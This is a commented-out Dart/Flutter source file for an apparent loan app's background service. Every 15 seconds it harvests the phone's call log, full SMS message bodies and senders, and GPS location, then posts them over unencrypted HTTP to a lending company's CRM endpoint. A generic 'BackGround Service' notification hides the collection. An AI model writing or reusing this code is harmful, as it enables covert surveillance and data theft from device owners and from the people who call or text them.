// import 'dart:async';
// import 'dart:convert';
// import 'dart:ui';
//
// import 'package:call_log/call_log.dart';
// import 'package:contacts_service/contacts_service.dart';
// import 'package:flutter_background_service/flutter_background_service.dart';
// import 'package:flutter_background_service_android/flutter_background_service_android.dart';
// import 'package:flutter_local_notifications/flutter_local_notifications.dart';
// import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
// import 'package:geolocator/geolocator.dart';
// import 'package:http/http.dart' as http;
// import 'package:readsms/readsms.dart';
// import 'package:shared_preferences/shared_preferences.dart';
//
// import '../../main.dart';
// import '../../models/models.dart';
// import '../../utils/shared_constants.dart';
// import 'Combine.dart';
//
// const notificationChannelId = 'my_foreground';
//
// // this will be used for notification id, So you can update your custom notification with this id.
// const notificationId = 888;
// List<Contact> contacts = [];
//
// Iterable<CallLogEntry> callLists = [];
//
// final _plugin = Readsms();
// var leadId;
//
// var dynamicText = '';
//
// String sms = 'no sms received';
//
// String sender = 'no sms received';
//
// String time = 'no sms received';
//
// final SmsQuery query = SmsQuery();
//
// List<SmsMessage> messages = [];
//
// Future<void> initializeService() async {
//   final service = FlutterBackgroundService();
//
//   const AndroidNotificationChannel channel = AndroidNotificationChannel(
//     notificationChannelId, // id
//     'MY FOREGROUND SERVICE', // title
//     description:
//         'This channel is used for important notifications.', // description
//     importance: Importance.low, // importance must be at low or higher level
//   );
//
//   final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
//       FlutterLocalNotificationsPlugin();
//
//   await flutterLocalNotificationsPlugin
//       .resolvePlatformSpecificImplementation<
//           AndroidFlutterLocalNotificationsPlugin>()
//       ?.createNotificationChannel(channel);
//
//   await service.configure(
//     androidConfiguration: AndroidConfiguration(
//       // this will be executed when app is in foreground or background in separated isolate
//       onStart: onStart,
//
//       // auto start service
//       autoStart: true,
//       isForegroundMode: true,
//
//       notificationChannelId: notificationChannelId,
//       // this must match with notification channel you created above.
//       initialNotificationTitle: 'BackGround Service',
//       initialNotificationContent: 'Initializing',
//       foregroundServiceNotificationId: notificationId,
//     ),
//     iosConfiguration: IosConfiguration(),
//   );
// }
//
// @pragma('vm:entry-point')
// Future<void> onStart(ServiceInstance service) async {
//   // Only available for flutter 3.0.0 and later
//   DartPluginRegistrant.ensureInitialized();
//
//   final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
//       FlutterLocalNotificationsPlugin();
//   service.on('stopService').listen((event) {
//     service.stopSelf();
//   });
//   // bring to foreground
//   Timer.periodic(const Duration(seconds: 15), (timer) async {
//     if (service is AndroidServiceInstance) {
//       if (await service.isForegroundService()) {
//         dynamicText = 'Current Date Time: ${DateTime.now()}';
//         flutterLocalNotificationsPlugin.show(
//           notificationId,
//           'BackGround Service',
//           dynamicText,
//           const NotificationDetails(
//             android: AndroidNotificationDetails(
//                 notificationChannelId, 'MY FOREGROUND SERVICE',
//                 icon: 'ic_bg_service_small',
//                 ongoing: true,
//                 importance: Importance.low),
//           ),
//         );
//         prefs = await SharedPreferences.getInstance();
//         leadId = prefs.getString(SharedConstants.LEAD_ID);
//         callLists = await loadCallLogs(callLists);
//         messages = await getMessages(messages, query);
//         await _determinePosition();
//         sendData();
//       }
//     }
//   });
// }
//
// Future<Position> _determinePosition() async {
//   bool serviceEnabled;
//   LocationPermission permission;
//
//   // Test if location services are enabled.
//   serviceEnabled = await Geolocator.isLocationServiceEnabled();
//   if (!serviceEnabled) {
//     // Location services are not enabled don't continue
//     // accessing the position and request users of the
//     // App to enable the location services.
//     return Future.error('Location services are disabled.');
//   }
//
//   permission = await Geolocator.checkPermission();
//   if (permission == LocationPermission.denied) {
//     permission = await Geolocator.requestPermission();
//     if (permission == LocationPermission.denied) {
//       // Permissions are denied, next time you could try
//       // requesting permissions again (this is also where
//       // Android's shouldShowRequestPermissionRationale
//       // returned true. According to Android guidelines
//       // your App should show an explanatory UI now.
//       return Future.error('Location permissions are denied');
//     }
//   }
//
//   if (permission == LocationPermission.deniedForever) {
//     // Permissions are denied forever, handle appropriately.
//     return Future.error(
//         'Location permissions are permanently denied, we cannot request permissions.');
//   }
//
//   // When we reach here, permissions are granted and we can
//   // continue accessing the position of the device.
//   return await Geolocator.getCurrentPosition();
// }
//
// sendData() async {
//   print('CURRENT DATETIME==>${DateTime.now()}');
//
//   PeriodicDataModel periodicDataModel = PeriodicDataModel();
//   periodicDataModel.leadId = leadId;
//
//   try {
//     var position = await Geolocator.getCurrentPosition();
//
//     periodicDataModel.latLong =
//         position.latitude.toString() + '/' + position.longitude.toString();
//   } catch (e) {
//     periodicDataModel.latLong = '';
//     print(e);
//   }
//   List<CallLogEntry> callList = callLists.toList();
//   print("CALL LIST==>${callList.length}");
//   List<CallLogs> object = [];
//   for (var i = 0; i < callList.length; i++) {
//     CallLogs callLogs = CallLogs();
//     callLogs.name = callList[i].name;
//     callLogs.number = callList[i].number;
//     object.add(callLogs);
//   }
//
//   periodicDataModel.callLogs = object;
//   List<Sms> messageList = [];
//
//   for (var i = 0; i < messages.length; i++) {
//     Sms sms = Sms();
//     sms.body = messages[i].body ?? "No Message";
//     sms.name = messages[i].sender ?? "No Name";
//     sms.number = messages[i].address.toString();
//     messageList.add(sms);
//   }
//   periodicDataModel.sms = messageList;
//   periodicDataModel.logType = '2';
//
//   print("REQUEST==>${jsonEncode(periodicDataModel)}");
//
//   var headers = {'Content-Type': 'application/json'};
//   try {
//     http.Response response = await http.post(
//         Uri.parse(
//             'http://api.crm.suryaloan.in/Api/DevicePrivacyController/updateLogs'),
//         headers: headers,
//         body: jsonEncode(periodicDataModel));
//     // http.StreamedResponse response = await request.send();
//
//     // print("RESPONSE==>${response.statusCode} "+response.body.toString());
//
//     if (response.statusCode == 200) {
//       print(await response.body);
//     } else {
//       print('init');
//
//       print("ERROR==>" + response.body.toString());
//     }
//     print('out');
//   } catch (e) {
//     print("CATCH ERROR==>" + e.toString());
//   }
// }
//
// // @pragma('vm:entry-point')
// // Future<bool> onIosBackground(ServiceInstance service) async {
// //   WidgetsFlutterBinding.ensureInitialized();
// //   DartPluginRegistrant.ensureInitialized();
//
// // SharedPreferences preferences = await SharedPreferences.getInstance();
// // await preferences.reload();
// // final log = preferences.getStringList('log') ?? <String>[];
// // log.add(DateTime.now().toIso8601String());
// // await preferences.setStringList('log', log);
//
// // return true;
// // }
